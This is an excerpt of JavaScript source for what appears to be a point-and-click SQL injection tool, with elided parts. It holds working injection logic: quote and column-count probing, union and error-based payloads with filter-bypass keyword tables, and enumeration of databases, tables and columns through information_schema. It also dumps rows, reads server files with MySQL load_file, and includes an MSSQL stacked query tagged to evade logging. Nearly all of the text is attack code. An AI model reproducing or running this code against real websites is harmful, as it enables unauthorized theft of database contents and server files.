...
function SQLIAjax(dt,completefs,sleep){
	setTimeout(function(){
		if(VTM['request']=='get'){
			$.ajax({
				url: dt,
...
{
	if(SQL['ErrorData'].split(SQL['stop']).length < 2)
	{
		var query = URL[0]+ SQL[VTM['bypass']]['concat']+ "(" + t2h(SQL['ErrorChar']) + ",substr(" +inject + ","+ count +",50)," + t2h(SQL['ErrorChar']) +")"+ URL[1];
		SQLIAjax(query,
			function(xhr){
				SQL['ErrorData'] += xhr.responseText.split(SQL['ErrorChar'])[1];
				if(SQL['ErrorData'] != ""){
...
function QueryCreater(data){
	return "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+data+SQL[VTM['bypass']]['as']+SQL['space']+"T"+")))),"+t2h(SQL['stop'])+"))";
}
function AddDB(dbs)
{
	Add(dbs,ActiveDBs,function(data){
		$("#dblist #body").append("<div class='dbname active' id='db"+i+"'>"+data+"</div>");
	},MySQLGetDBs);
}
function MySQLGetDBs(count)
{
	if(VTM['type'] == 'mysql'){
		/*var injectdbs = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+
		
		SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['schema_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['schemata']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")"
		
		+SQL[VTM['bypass']]['as']+SQL['space']+"T"+")))),"+t2h(SQL['stop'])+"))";*/
		var injectdbs = QueryCreater(SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['schema_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['schemata']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")");
	}else{
...
function ActiveTBs(i)
{
	if(i)
	{
		Image($("#dblist #body #"+TMP['dbid']),i,"right");
		Image($("#tblist #head"),i,"3px");
		$("#tblist #body").css("background","");
	}else
	{
		Image($("#tblist #body"),0,"left");
		Image($("#tblist #head"),0,"left");
		Image($("#dblist #body #"+TMP['dbid']),0,"left");
...
function AddTB(tbs){
	Add(tbs,ActiveTBs,function(data){
		$("#tblist #body").append("<div class='tbname active' id='tb"+i+"'>"+data+"</div>");
	},MySQLGetTBs);
}
function MySQLGetTBs(count)
{
	if(VTM['type'] == 'mysql'){
		/*var injecttbs = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+
		
		SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['table_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['tables']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")"
		
		+SQL[VTM['bypass']]['as']+"T"+")))),"+t2h(SQL['stop'])+"))";*/
		var injecttbs = QueryCreater(SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['table_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['tables']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")");
	}else{
...
function AddCL(cls){
	Add(cls,ActiveCLs,function(data){
		data = data.split('.');
		$("#cllist #body").append("<div class='clname active'><div class='clcheck'><input type='checkbox'></div><div id='cl"+i+"' class='cl' >"+data[0]+"</div><div class='cltype'>"+h2t(data[1])+"</div></div>");
	},MySQLGetCLs);
}
...
{
	if(VTM['type'] == 'mysql'){
		/*var injectcls = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+
		
		SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+SQL[VTM['bypass']]['column_name']+",0x2e,hEx(COLUMN_TYPE))"+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['columns']+SQL['space']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_name']+"="+t2h(DATA['table'])+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")"
		
		+SQL[VTM['bypass']]['as']+"T"+")))),"+t2h(SQL['stop'])+"))";*/
		var injectcls = QueryCreater(SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+SQL[VTM['bypass']]['column_name']+",0x2e,hEx(COLUMN_TYPE))"+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['columns']+SQL['space']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_name']+"="+t2h(DATA['table'])+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")");
	}else{
		var injectcls = ";begin declare @r varchar(8000);set @r="+t2h(SQL['start'])+";SELECT TOP "+VTM['limit']+" @r=@r%2bcast(column_name as varchar(8000))%2b'.0x756e6b6e6f77,' FROM information_schema.columns WHERE table_name in('"+DATA['table']+"') and table_schema in('"+DATA['database']+"') and column_name NOT IN(SELECT TOP "+count+" column_name FROM information_schema.columns where table_name in('"+DATA['table']+"') and table_schema in('"+DATA['database']+"') ORDER BY 1) ORDER BY 1;select @r=@r%2bcast("+t2h(SQL['stop'])+" as varchar(100));select convert(int,rtrim(@r));end;--sp_password";
	}
	if(VTM['method'] == 'union'){
		injectcls = URL[0] + injectcls + URL[1];
		SQLIAjax(injectcls,AddCL,0);
	}else if(VTM['method'] == 'error'){
...
function AddRW(data)
{
	var rw = data.responseText.split(SQL['start'])[1].split(SQL['stop'])[0].split(SQL['mid']);
...
function MySQLGetRWs()
{
	...
	if(VTM['type'] == 'mysql'){
		/*var injectrow = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['unhex(hex']+"("+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",";
		for(c=0; c<DATA['columns'].length; c++) {
			injectrow += DATA['columns'][c][0] + "," + t2h(SQL['mid']) + ",";
		}
		injectrow += t2h(SQL['stop'])+")))"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+DATA['database']+"."+DATA['table']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+DATA['count']+",1)";*/
	}else{
		
	}
	if(VTM['method'] == 'union'){
		injectrow = URL[0] + injectrow + URL[1];
		SQLIAjax(injectrow,AddRW,VTM['sleep']);
	}else if(VTM['method'] == 'error'){
...
function AddLFContain(data){
	data = data.responseText.split(SQL['start']);
	if(typeof data[1] != "undefined"){
		data = data[1].split(SQL['stop'])[0].split(SQL['ErrorChar'])
...
function MySQLLoadFile(fname,callback){
	...
	var lf = SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+","+t2h(fname+SQL['ErrorChar'])+","+SQL[VTM['bypass']]['unhex(hex']+"("+SQL[VTM['bypass']]['load_file']+"("+ t2h(fname) +"))),"+t2h(SQL['stop'])+")";
	
	if(VTM['method'] == "union"){
		lf = URL[0] + lf + URL[1];
		SQLIAjax(lf,callback,0);
	}else{
...
function AdminScanFile(count){
	if(AdminFileList[count] == "" || typeof AdminFileList[count] == "undefined"){
		AdminScanDir(SADMIN['subdir']+SADMIN['dirid']+1);
	}else{
...
function IjtGetQuote(count){
	...
	var len = URL[0]+QUOTE[count][0]+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+"1=1"+IJT['end']+QUOTE[count][1]+ URL[1];
	var len1 = URL[0]+QUOTE[count][0]+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+"1=0"+IJT['end']+QUOTE[count][1]+ URL[1];
	SQLIAjax(len,
		function(xhr){
			SQLIAjax(len1,
				function(xhr1){
...
function IjtOrderBy(){
	...
	var len = URL[0]+IJT['quote'][0]+SQL['space']+SQL[VTM['bypass']]['order']+SQL['space']+SQL[VTM['bypass']]['by']+SQL['space']+"99999"+IJT['end']+IJT['quote'][1]+ URL[1];
	IJT['ordercount'] = 10;
	SQLIAjax(len,
		function(xhr){
...
function IjtColumnLength(count){
	var len = URL[0]+IJT['quote'][0]+SQL['space']+SQL[VTM['bypass']]['order']+SQL['space']+SQL[VTM['bypass']]['by']+SQL['space']+count+IJT['end']+IJT['quote'][1]+ URL[1];
	SQLIAjax(len,
		function(xhr){
			if(Math.abs(xhr.responseText.length - IJT['tmp']) < VTM['offset']){//false
...
function IjtNumAvail(){
	...
	var str = URL[0]+"999"+IJT['quote'][0]+SQL['space']+SQL[VTM['bypass']]['union']+SQL['space']+SQL[VTM['bypass']]['select']+SQL['space']+num.slice(0,-1)+IJT['end']+IJT['quote'][1]+URL[1];
	SQLIAjax(str,
		function(xhr){
			...
			if(typeof num[1] == 'undefined'){
				...
				IJT['numavail'] = parseInt(num[1].split("|")[0]);
				...
				var str = URL[0]+"999"+IJT['quote'][0]+SQL['space']+SQL[VTM['bypass']]['union']+SQL['space']+SQL[VTM['bypass']]['select']+SQL['space']+qr.slice(0,-1)+IJT['end']+IJT['quote'][1]+URL[1];
